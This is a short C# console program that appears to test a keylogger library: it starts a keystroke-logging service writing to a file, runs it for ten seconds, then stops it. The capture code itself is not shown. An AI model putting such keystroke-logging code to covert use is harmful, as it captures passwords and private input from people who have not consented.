using KeyLogger.Library;
using KeyLogger.Library.Appenders;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLoggerLibrary.ConsoleTest
{
    public class Program
    {

        static void Main(string[] args)
        {
            IKeyLoggerService _service = new KeyLoggerService();

            _service.SetOutputMode = FileAppender.Instance;
            _service.Start();

            //Sleeping 10 seconds
            Thread.Sleep(10000);

            _service.Stop();

            _service = null;

#if DEBUG
            Console.WriteLine("Press enter to close...");
            Console.ReadLine();
#endif
        }
    }
}
